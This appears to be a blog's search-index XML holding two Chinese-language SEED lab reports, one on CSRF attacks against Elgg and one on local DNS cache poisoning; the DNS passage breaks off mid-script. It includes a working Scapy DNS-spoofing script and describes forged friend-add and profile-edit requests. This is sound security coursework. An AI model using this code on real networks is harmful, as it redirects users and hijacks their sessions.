<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Cross-Site Request Forgery Attack Lab</title>
    <url>/2022/11/30/CSRF/</url>
    <content><![CDATA[<h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h2><p>本实验的目的是帮助学生了解跨站请求伪造（CSRF）攻击。CSRF 攻击涉及一个受害用户、一个受信任的网站和一个恶意网站。受害用户在访问恶意站点时，正在与受信任的网站保持活动会话。恶意网站将可信网站的HTTP 请求注入到受害者用户会话中，造成损害。</p>
<span id="more"></span>
<p>在本实验中，学生们将通过CSRF 攻击来攻击一个社交网络应用。这个开源的社交网络应用被称为Elgg，它已经被安装在我们的虚拟机中。Elgg 中有针对CSRF 的防御措施，但为了达到本实验的目的，我们已经将这些防御措施关闭。本实验覆盖以下主题:</p>
<p>1. 跨站请求伪造攻击</p>
<p>2. CSRF 对抗措施：秘密令牌（secret token）和同站cookie（same-site cookie）</p>
<p>3. HTTP GET 和POST 请求</p>
<p>4. JavaScript 和Ajax</p>
<h2 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h2><h3 id="2-1-Task-1：观察HTTP-请求"><a href="#2-1-Task-1：观察HTTP-请求" class="headerlink" title="2.1 Task 1：观察HTTP 请求"></a>2.1 Task 1：观察HTTP 请求</h3><p>在跨站请求伪造攻击中，我们需要伪造HTTP 请求。因此，我们需要知道一个合法的HTTP 请求是什么样子的，以及它使用什么参数等。为此，我们可以使用一个名为”HTTP Header Live” 的火狐浏览器插件。本任务的目标是熟悉这个工具。指导中给出了如何使用这个工具的说明(§ 5.1)。请使用这个工具在Elgg 中捕获一个HTTP GET 请求和一个HTTP POST 请求。请在你的报告中指出这些请求中所使用的参数。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221440.png"></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221450.png"></p>
<p>在合法用户进行登录利用该工具进行抓取http报文，可以分别得到上图所示的POST报文和GET报文</p>
<p>在POST报文中，有elgg_token,elgg_ts,username和password等参数，而在GET报文中没有参数显示。</p>
<h3 id="2-2-Task-2：使用GET-请求的CSRF-攻击"><a href="#2-2-Task-2：使用GET-请求的CSRF-攻击" class="headerlink" title="2.2 Task 2：使用GET 请求的CSRF 攻击"></a>2.2 Task 2：使用GET 请求的CSRF 攻击</h3><p>在这个任务中，我们需要Elgg 社交网络中的两个账户Alice 和Samy。Samy 想成为Alice 的朋友，但Alice 拒绝添加他为好友。Samy 决定使用CSRF 攻击来实现他的目标。他向Alice 发送了一个URL（通过电子邮件或在发布在Elgg 上）。Alice 对这个网址很好奇，点击了这个网址，这就把她带到了Samy 的网站 <a href="http://www.attacker32.com/">www.attacker32.com</a>  。假设你是Samy，描述你如何构建网页的内容，以便当Alice 访问该网页时，Samy 能够被添加到Alice 的好友列表中（假设Alice 有一个活跃的Elgg 会话）</p>
<p>实现思路：</p>
<p>通过抓获合法添加好友过程中得到的报文，观察其中的参数结构，然后通过修改其参数，构建网页的内容</p>
<p>实现步骤：</p>
<p>首先登录到Samy的用户界面后，合法的把Alice添加为好友，在该过程中利用插件工具进行抓获http报文如下：</p>
<p>可以看到其url请求为 ”<a href="http://www.seed-server.com/action/friends/add?friend=56%E2%80%9D">http://www.seed-server.com/action/friends/add?friend=56”</a> 开头，该56为Alice的guid</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221545.png"></p>
<p>因此我们想要让Alice添加Samy为好友的话，需要把friend后的参数修改为Samy的guid。而Samy的guid可以在合法登录到Samy的用户界面后，通过网页的源码得到，如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221601.png"></p>
<p>最后根据得到的gid构造img上所附带的链接，如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221614.png"></p>
<p>攻击实现如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221635.png"></p>
<p>在攻击页面中，点击链接后，刷新Alice的好友页面，就可以观察到Samy被成功添加为Alice的好友。</p>
<h3 id="2-3-Task-3：使用POST-请求的CSRF-攻击"><a href="#2-3-Task-3：使用POST-请求的CSRF-攻击" class="headerlink" title="2.3 Task 3：使用POST 请求的CSRF 攻击"></a>2.3 Task 3：使用POST 请求的CSRF 攻击</h3><p>在把自己加入Alice 的朋友名单后，Samy 想进行更多的攻击。他想让Alice 在她的个人资料中写上”Samy is my Hero”，使得所有人都能够看到。当然，Alice 不喜欢Samy，更不用说把这个声明写进她的个人资料中。Samy 计划使用CSRF 攻击来实现这一目标，也就是这个Task 的目标。</p>
<p>实现思路：</p>
<p>同上一个任务中的方法，在合法用户修改个人资料的过程中，利用插件截获http报文后，根据报文中的参数进行修改攻击页面中的内容，即可实现攻击。</p>
<p>实现步骤：</p>
<p>首先在Samy的用户页面中，进行修改自己的个人资料，把个人描述修改为“Samy is my hero.”在提交过程中，利用插件进行捕获http报文，得到如下结果：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221711.png"></p>
<p>可以看到该链接的网址以及报文中的参数内容，然后根据得到的报文对攻击网页的源码进行修改，即修改网页文件中的field中的参数以及p.action的内容。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221846.png"></p>
<p>修改后，进入该攻击页面，即可成功修改Alice的个人资料如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221906.png"></p>
<p>问题回答：</p>
<p>问题1：如何获取Alice的guid？</p>
<p>答：在上一个任务中，通过Samy在自己的用户页面添加Alice为好友的过程中，截获http报文，即可得到Alice的guid。</p>
<p>问题2：如果Boby 想向任何访问他的恶意网页的人发动攻击。在这种情况下，他事先不知道谁在访问该网页。那么他还能发动CSRF 攻击来修改受害者的Elgg 资料吗？请解释原因。</p>
<p>答：不可以。因为在攻击过程中需要知道受害者的guid并且预先设置好，如果是未知用户访问的话是不能够及时构造的。</p>
<h3 id="2-4-Task-4：开启Elgg-的防御措施"><a href="#2-4-Task-4：开启Elgg-的防御措施" class="headerlink" title="2.4 Task 4：开启Elgg 的防御措施"></a>2.4 Task 4：开启Elgg 的防御措施</h3><p>开启防御措施要打开防御措施，首先要进入Elgg 容器的&#x2F;var&#x2F;www&#x2F;elgg&#x2F;vendor&#x2F;elgg&#x2F;elgg&#x2F;engine&#x2F;classes&#x2F;Elgg&#x2F;Security 文件夹，从Csrf.php 中删除return 语句。你可以使用一个内置在容器中的简单编辑器，名为nano 。在做了修改之后再次重复之前的攻击，看看你的攻击是否会成功。请指出捕获的HTTP 请求中的秘密令牌，并解释为什么攻击者为什么不能在CSRF 攻击中发送这些秘密令牌；是什么阻止了他们从网页上发现秘密令牌？</p>
<p>实现步骤：</p>
<p>首先在容器中修改文件内容，讲return语句注释掉，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221957.png"></p>
<p>然后重新进行攻击，可以观察到如下结果：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222034.png"></p>
<p>可以发现两次攻击都无法成功，网页会报错”form is missing __token or __ts fields”</p>
<p>捕获的http请求中的token如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222100.png"></p>
<p>由于return注释掉后，会执行validate函数，提取出请求中的两个参数__token 和__ts，但是由于在此前构造请求时没有补充这两个参数，因而会报错，并且攻击会失败</p>
<h3 id="2-5-Task-5：测试同站Cookie-方法"><a href="#2-5-Task-5：测试同站Cookie-方法" class="headerlink" title="2.5 Task 5：测试同站Cookie 方法"></a>2.5 Task 5：测试同站Cookie 方法</h3><p>当访问该网站时，浏览器上会设置三个cookie，分别是：cookie-normal、cookie-lax 和cookie-strict。正如其名称所示，第一个cookie 只是一个普通的cookie，第二个和第三个cookie 是两种不同类型的同站cookie（Lax 和Strict）。我们设计了两组实验来观察当发送HTTP 请求时，哪些cookie 会被附加到服务器上。通常情况下，属于服务器的所有cookie 都将被附加到请求中，除了同站cookie。</p>
<p>请点击两个实验的链接。链接A 指向example32.com 上的一个页面，而链接B 则指向attacker32.com 上一个页面。两个页面都是相同的（除了背景颜色），并且它们都发送三种不同的请求到 <a href="http://www.example32.com/showcookies.php">www.example32.com/showcookies.php</a> ，这个链接只是显示浏览器发送的cookies。通过观察显示的结果，你可以知道哪些cookie 会被浏览器发送。请完成以下要求：</p>
<p>• 请描述你所看到的情况，并解释为什么在某些情况下不发送一些cookie。</p>
<p>在同站请求的三种情况下，三个cookie都被发送</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222143.png"></p>
<p>在跨站请求的情况下：</p>
<p>Sending Get Request (link)：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222157.png"></p>
<p>Sending Get Request (form)：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222254.png"></p>
<p>Sending Post Request (form)：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222318.png"></p>
<p>通过观察，可以得知，在跨站请求中，strict值都会阻止浏览器发送cookie到目标站点，而lax值则只有在post请求中才会被阻止发送。解释如下：</p>
<p>查阅RFC文档中的<a href="https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7">samesite</a>部分可以得到如下内容：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222333.png"></p>
<p>从中可以得知strict值将阻止浏览器在所有跨网站浏览上下文中将 cookie 发送到目标站点，即使遵循常规链接也是如此。而 Lax 值为希望在用户从外部链接到达后维护用户登录会话的网站提供了安全性和可用性之间的合理平衡，因此在get请求中会发送而在post请求中为了防御CSRF而不会被发送。</p>
<p>• 根据你的理解，请描述同站cookies 如何帮助服务器检测一个请求是跨站还是同站请求。</p>
<p>只需要检查该请求中的Strict值是否还在，即可知道该请求是跨站还是同站请求，因为在同站请求中，三个值都会保留而跨站请求中Strict值都不会被发送。</p>
<p>• 请描述你将如何使用同站cookie机制来帮助Elgg防御CSRF攻击。只需要描述思路，无需实现。</p>
<p>利用同站cookie和token一同使用，利用strit值进行检查是否为跨站请求。在服务端产生同步token，为用户的每一次会话请求都进行验证。并且token不应该用cookies进行传送，而是作为响应缓存的一部分，比如HTML或者JSON响应。</p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>seedlab2.0</tag>
      </tags>
  </entry>
  <entry>
    <title>Local DNS Attack Lab</title>
    <url>/2022/11/29/DNS_local/</url>
    <content><![CDATA[<p>完成时间 <em>2022.11.29</em></p>
<h2 id="一-实验目标"><a href="#一-实验目标" class="headerlink" title="一.实验目标"></a>一.实验目标</h2><p>DNS(域名系统)是互联网的电话簿;它将主机名转换为IP地址(反之亦然)。这种转换是通过DNS解析进行的，它发生在幕后。DNS攻击操作这个解决方案以各种方式进行，目的是误导用户到其他目的地，它们通常是恶意的。这个实验室的目的是了解这种攻击是如何发生的。学生将首先建立和配置DNS服务器，然后他们将尝试各种DNS攻击的目标也是在实验室环境中。</p>
<span id="more"></span>
<p>攻击本地受害者和远程DNS服务器的难度是完全不同的。因此,我们开发了两个实验室，一个专注于本地DNS攻击，另一个专注于远程DNS攻击。这个实验室关注本地攻击。本实验室涵盖以下主题:</p>
<blockquote>
<p>•DNS及其工作原理</p>
<p>•DNS服务器设置</p>
<p>•DNS缓存投毒攻击</p>
<p>•欺骗DNS响应</p>
<p>•包嗅探和欺骗</p>
<p>•Scapy工具</p>
</blockquote>
<h2 id="二-实验原理"><a href="#二-实验原理" class="headerlink" title="二.实验原理"></a>二.实验原理</h2><h3 id="2-1-DNS协议"><a href="#2-1-DNS协议" class="headerlink" title="2.1 DNS协议"></a>2.1 DNS协议</h3><p>域名系统（英语：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53[1]。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p>
<h3 id="2-2-拓扑搭建"><a href="#2-2-拓扑搭建" class="headerlink" title="2.2 拓扑搭建"></a>2.2 拓扑搭建</h3><p>DNS 缓存中毒攻击的主要目标是本地 DNS 服务器。 显然，攻击真实的是非法的服务器，所以我们需要架设自己的DNS服务器来进行攻击实验。 实验室环境需要四台独立的机器：一台给受害者，一台给本地 DNS 服务器，另外两台给攻击者。实验环境设置如图 1 所示。本实验侧重于本地攻击，因此我们将所有这些同一局域网上的机器。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181004397.png"></p>
<h2 id="三-实验器材"><a href="#三-实验器材" class="headerlink" title="三.实验器材"></a>三.实验器材</h2><p>1．Ubuntu20.04。</p>
<p>2．Docker.</p>
<h2 id="四-实验步骤及运行结果"><a href="#四-实验步骤及运行结果" class="headerlink" title="四.实验步骤及运行结果"></a>四.实验步骤及运行结果</h2><h3 id="4-1-Task-1-Directly-Spoofing-Response-to-User"><a href="#4-1-Task-1-Directly-Spoofing-Response-to-User" class="headerlink" title="4.1 Task 1: Directly Spoofing Response to User"></a>4.1 Task 1: Directly Spoofing Response to User</h3><p>当用户在网络浏览器中键入网站名称（主机名，例如 <a href="http://www.example.com)时,用户电脑会向本地dns服务器发送dns请求,解析主机的ip地址姓名./">www.example.com）时，用户电脑会向本地DNS服务器发送DNS请求，解析主机的IP地址姓名。</a> 攻击者可以嗅探 DNS 请求消息，然后他们可以立即创建一个虚假的 DNS 响应，并发送回用户机器。 如果假回复比真实回复早到达，它将被接受用户机器。见下图：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181004804.png"></p>
<p>请编写一个程序来发起这样的攻击。</p>
<p>实现过程：</p>
<p>在本次攻击时，主要是针对于用户向本地DNS发送请求时，攻击者对用户进行DNS响应，因此可以进行报文伪造的过程如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181005997.png"></p>
<p>根据实验手册中的脚本进行改写如上，其中网卡可以在攻击者主机中使用ip a查询得到，如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181005381.png"></p>
<p>在进行攻击前，先利用dig指令查询<a href="http://www.example.net的原始DNS名称服务：">www.example.net的原始DNS名称服务：</a></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181005838.png"></p>
<p>可以看到其为 93.781.216.34，然后开始进行攻击：</p>
<p>Step1：</p>
<p>清除本地DNS服务器的缓存，如果不进行清除的话，用户在向本地DNS服务器进行查询时，其响应速度快于构造报文的转发速度，因而会导致攻击失败。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181006474.png"></p>
<p>Step2：</p>
<p>执行攻击脚本，再次利用dig查询网址的DNS服务名称，如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181006694.png"></p>
<p>可以观察到被成功修改为了1.1.1.1，证明攻击成功。</p>
<p>Step3：</p>
<p>查看脚本在网络中嗅探到的报文：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181006931.png"></p>
<p>可以观察到该报文是从用户发给本地DNS服务器的，而攻击者正是在该过程中，先于本地DNS服务器，将伪造的报文发送给用户，从而实现攻击。</p>
<h3 id="4-2-Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers"><a href="#4-2-Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers" class="headerlink" title="4.2 Task 2: DNS Cache Poisoning Attack – Spoofing Answers"></a>4.2 Task 2: DNS Cache Poisoning Attack – Spoofing Answers</h3><p>上述攻击针对的是用户的机器。为了达到持久的效果，每次用户的机器发出对 <a href="http://www.example.com/">www.example.com</a> 的 DNS 查询 攻击者的机器必须发出一个欺骗性的DNS 响应。这可能不是那么有效；有一种更好的方法来进行攻击DNS 服务器，而不是用户的机器。当本地 DNS 服务器收到查询时，它首先从自己的缓存中查找答案；如果答案在那里，DNS 服务器将简单地使用其缓存中的信息进行回复。如果答案不在缓存，DNS 服务器将尝试从其他 DNS 服务器获取答案。当它得到答案时，它会将答案存储在缓存中，因此下次无需询问其他 DNS 服务器。参见图 2。因此，如果攻击者可以欺骗其他 DNS 服务器的响应，则本地 DNS 服务器将保留缓存中的欺骗性响应会持续一段时间。下次，当用户的机器想要解析相同的主机名，它将从缓存中获取欺骗响应。这样，攻击者只需要欺骗一次，影响将持续到缓存信息过期。这种攻击称为 DNS 缓存中毒。请修改上一个任务中使用的程序以进行此攻击。</p>
<p>实现过程：</p>
<p>对python脚本做如下修改：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181007740.png"></p>
<p>修改主要在于嗅探使过滤器的内容，将其源主机修改为本地DNS服务器的IP地址即可。同理在攻击前应该先查看目标网站的原始DNS名称服务内容，同task1中的内容，故不重复。然后开始进行攻击：</p>
<p>Step1：</p>
<p>清除本地DNS服务器中已有的缓存</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181007782.png"></p>
<p>Step2：</p>
<p>执行攻击脚本，并且用dig命令查看目标网站的DNS域名如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181008873.png"></p>
<p>可以观察到来自于本地DNS服务器中的内容已经修改为了脚本所指定的2.2.2.2，然后再本地DNS服务器中查看缓存内容：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181008709.png"></p>
<p>攻击脚本中的内容已经成功写入本地DNS服务器，证明攻击成功。</p>
<p>Step3：</p>
<p>在攻击后，可以查看攻击脚本执行时，所嗅探到的报文如下，是在本地DNS与目标网站的DNS进行通信时，所截获然后进行伪造的。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181008028.png"></p>
<h3 id="4-3-Task-3-Spoofing-NS-Records"><a href="#4-3-Task-3-Spoofing-NS-Records" class="headerlink" title="4.3 Task 3: Spoofing NS Records"></a>4.3 Task 3: Spoofing NS Records</h3><p>在上一个任务中，我们的 DNS 缓存投毒攻击只影响一个主机名，即<a href="http://www.example.com.如果用户试图获取另一个主机名的/">www.example.com。如果用户试图获取另一个主机名的</a> IP 地址，例如 mail.example.com，我们需要启动再次袭击。 如果我们发起一次可以影响整个 example.com 的攻击，效率会更高领域。这个想法是在 DNS 回复中使用 Authority 部分。 基本上，当我们欺骗回复时，另外为了欺骗答案（在答案部分），我们在授权部分添加以下内容。 当这个条目由本地 DNS 服务器缓存，ns.attacker32.com 将用作将来的名称服务器查询 example.com 域中的任何主机名。 由于 ns.attacker32.com 由攻击者，它可以为任何查询提供伪造的答案。 本机IP地址为10.9.0.153我们的设置。请在你的攻击代码中添加一条伪造的NS记录，然后发起攻击。</p>
<p>实现过程：</p>
<p>实现前我们可以现在攻击者的DNS中查看其所指定的域名内容如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181009187.png"></p>
<p>然后构造攻击脚本如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181009001.png"></p>
<p>在task2的基础上添加了The Authority Section，作为伪造内容。利用该脚本即可进行如下攻击：</p>
<p>Step1：</p>
<p>清空本地DNS的缓存内容：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010491.png"></p>
<p>Step2：</p>
<p>执行攻击脚本，并且利用dig命令查询目标网址的DNS名称如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010663.png"></p>
<p>可以观察到其内容被成功修改为3.3.3.3，然后再本地DNS服务器上查看当前的缓存内容如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010398.png"></p>
<p>观察到example.com部分的内容均有脚本所设置的攻击者DNS提供服务，然后利用dig命令查看其是否生效，如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010809.png"></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181011373.png"></p>
<p>可以看到其均为攻击者DNS所指定的内容，因而攻击成功。</p>
<p>在此处关于<a href="http://www.example.net该内容由于已经在攻击脚本中指定为3.3.3.3并且在攻击过程中成功存入了本地DNS，因而会优先显示3.3.3.3而不是攻击者DNS中所指定的1.2.3.5。">www.example.net该内容由于已经在攻击脚本中指定为3.3.3.3并且在攻击过程中成功存入了本地DNS，因而会优先显示3.3.3.3而不是攻击者DNS中所指定的1.2.3.5。</a></p>
<h3 id="4-4-Task-4-Spoofing-NS-Records-for-Another-Domain"><a href="#4-4-Task-4-Spoofing-NS-Records-for-Another-Domain" class="headerlink" title="4.4 Task 4: Spoofing NS Records for Another Domain"></a>4.4 Task 4: Spoofing NS Records for Another Domain</h3><p>在前面的攻击中，我们成功地毒化了本地 DNS 服务器的缓存，所以 ns.attacker32.com成为 example.com 域的名称服务器。 受到这一成功的启发，我们想扩展它对其他领域的影响。 即，在由对 <a href="http://www.example.com/">www.example.com</a> 的查询触发的欺骗响应中，我们想在授权部分添加额外的条目（见下文），所以 ns.attacker32.com 也用作 google.com 的名称服务器。</p>
<p>请稍微修改您的攻击代码，以对您本地的 DNS 服务器发起上述攻击。 之后攻击，检查 DNS 缓存并查看缓存了哪些记录。 请描述并解释你的观察结果。应该注意的是，我们正在攻击的查询仍然是对 example.com 的查询，而不是对google.com。</p>
<p>实现过程：</p>
<p>修改脚本代码如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181011847.png"></p>
<p>即在授权部分将谷歌的网站也添加进去，然后再利用该脚本进行如下攻击：</p>
<p>Step1：</p>
<p>清空本地DNS的缓存内容</p>
<p>Step2：</p>
<p>在攻击者主机中执行攻击脚本，然后再用户主机中利用dig命令查询目标网站的DNS名称如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181011763.png"></p>
<p>可以观察到其内容被成功修改为4.4.4.4，随后再本地DNS服务器上查询缓存：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181012617.png"></p>
<p>可以观察到google并没有被写入到本地DNS服务器上，而是只有example.com的DNS被成功修改为了攻击者所提供的DNS，通过查询<a href="https://datatracker.ietf.org/doc/html/rfc1034#section-3.7">RFC1034</a> 3.7节中关于authority section 部分的解释，原因在于，在该部分中应该描述answer section中数据的权威域名服务，而在所构造的报文answer部分是根据嗅探到的报文所构建的，而在dig请求中并没google.com 因此answer部分没有，所以只在 authority section 部分的构造并不会写入本地的DNS。</p>
<h3 id="4-5-Task-5-Spoofing-Records-in-the-Additional-Section"><a href="#4-5-Task-5-Spoofing-Records-in-the-Additional-Section" class="headerlink" title="4.5 Task 5: Spoofing Records in the Additional Section"></a>4.5 Task 5: Spoofing Records in the Additional Section</h3><p>在 DNS 回复中，有一个称为附加部分的部分，用于提供附加信息。在实践中，它主要用于为一些主机名提供IP地址，尤其是那些出现在管理局部分。 这个任务的目标是欺骗本节中的一些条目，看看它们是否将被目标本地 DNS 服务器成功缓存。 特别是，在响应查询时<a href="http://www.example.com,我们在欺骗回复中添加以下条目,除了答案部分条目1和2与权限部分中的主机名相关./">www.example.com，我们在欺骗回复中添加以下条目，除了答案部分条目1和2与权限部分中的主机名相关。</a> Entry 完全无关紧要回复中的任何条目，但它为用户提供了“优雅”的帮助，因此他们无需查找 IP脸书地址。 请使用 Scapy 欺骗这样的 DNS 回复。 你的工作是报告哪些条目将是成功缓存，哪些条目不会被缓存； 请解释原因。</p>
<p>实现过程：</p>
<p>修改脚本代码如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013939.png"></p>
<p>即添加三个实验手册中所指定的附加部分。然后利用该脚本进行攻击如下：</p>
<p>Step1：</p>
<p>清空本地DNS服务器的缓存：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013320.png"></p>
<p>Step2：</p>
<p>在攻击者主机中执行攻击脚本，然后再用户主机上利用dig指令查询目标网站的DNS名称服务如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013394.png"></p>
<p>可以观察到其IP被成功修改为了脚本中所指定的5.5.5.5，然后在本地服务器上查看缓存内容如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013586.png"></p>
<p>可以观察到只有example.com. 777548 IN NS ns.example.com. 和 ns.attacker32.com 被成功写入到本地DNS中，而其他在additional section的三个条目均没有被成功缓存。</p>
<p>根据RFC1034中的实例以及对于query的介绍可以得知原因在于，additional section中应该补充回答的是在answer section和authority section中所出现的ns，而此处并没有出现<a href="http://www.facebook.com/">www.facebook.com</a> 因此其并未被写入，而由于在answer section 中已经回答了<a href="http://www.example.com/">www.example.com</a> 的IP为 5.5.5.5，所以 ns.examle.com 和 ns.attacker32.com 也并未被写入。</p>
<h2 id="五-附件"><a href="#五-附件" class="headerlink" title="五.附件"></a>五.附件</h2><p>Task1</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.net&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.1.1.1&#x27;</span>)</span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">0</span>, arcount=<span class="number">0</span>,</span><br><span class="line">                     an=Anssec)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        <span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">        f = <span class="string">&#x27;udp and src host 10.9.0.5 and dst port 53&#x27;</span></span><br><span class="line">        pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns) </span><br></pre></td></tr></table></figure>



<p>Task2</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.net&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span 